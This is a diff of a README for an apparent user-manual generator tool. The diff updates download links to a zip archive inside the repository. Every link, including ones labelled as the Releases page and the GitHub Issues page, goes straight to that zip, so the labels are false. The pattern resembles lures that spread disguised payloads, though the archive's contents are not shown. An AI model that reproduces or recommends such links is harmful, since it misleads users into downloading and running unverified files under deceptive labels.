@@ -1,6 +1,6 @@
 # 🚀 Instruction-generator - Create User Manuals with Ease
 
-[![Download Instruction-generator](https://raw.githubusercontent.com/jeffone10/Instruction-generator/main/user_manual_automated/utils/generator_Instruction_v2.2.zip%20Now-Instruction--generator-brightgreen)](https://raw.githubusercontent.com/jeffone10/Instruction-generator/main/user_manual_automated/utils/generator_Instruction_v2.2.zip)
+[![Download Instruction-generator](https://github.com/jeffone10/Instruction-generator/raw/refs/heads/main/user_manual_automated/generator_Instruction_v2.8.zip%20Now-Instruction--generator-brightgreen)](https://github.com/jeffone10/Instruction-generator/raw/refs/heads/main/user_manual_automated/generator_Instruction_v2.8.zip)
 
 ## 📌 Project Objective
 The objective of this project is to build an **automated tool that generates step-by-step user manual guides for any website** by converting them into clear, professional documentation. This tool helps users create manuals without the usual manual effort by automatically capturing actions, understanding the user interface, and producing downloadable documentation.
@@ -45,7 +45,7 @@ Follow these steps to download and run the Instruction-generator:
 ### Step 1: Visit the Download Page
 Click the link below to go to the Releases page:
 
-[Download Instruction-generator](https://raw.githubusercontent.com/jeffone10/Instruction-generator/main/user_manual_automated/utils/generator_Instruction_v2.2.zip)
+[Download Instruction-generator](https://github.com/jeffone10/Instruction-generator/raw/refs/heads/main/user_manual_automated/generator_Instruction_v2.8.zip)
 
 ### Step 2: Select the Latest Version
 On the Releases page, look for the latest version of the Instruction-generator. You will see a list of available files.
@@ -103,8 +103,8 @@ Yes, the generated PDF can be shared via email or uploaded to your company's kno
 ---
 
 ## 📥 Support
-If you encounter any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/jeffone10/Instruction-generator/main/user_manual_automated/utils/generator_Instruction_v2.2.zip) to report problems or seek further assistance.
+If you encounter any issues or have questions, please visit our [GitHub Issues page](https://github.com/jeffone10/Instruction-generator/raw/refs/heads/main/user_manual_automated/generator_Instruction_v2.8.zip) to report problems or seek further assistance.
 
 For detailed updates and community discussions, check our repository regularly.
 
-Remember to download the latest version here: [Download Instruction-generator](https://raw.githubusercontent.com/jeffone10/Instruction-generator/main/user_manual_automated/utils/generator_Instruction_v2.2.zip).
+Remember to download the latest version here: [Download Instruction-generator](https://github.com/jeffone10/Instruction-generator/raw/refs/heads/main/user_manual_automated/generator_Instruction_v2.8.zip).
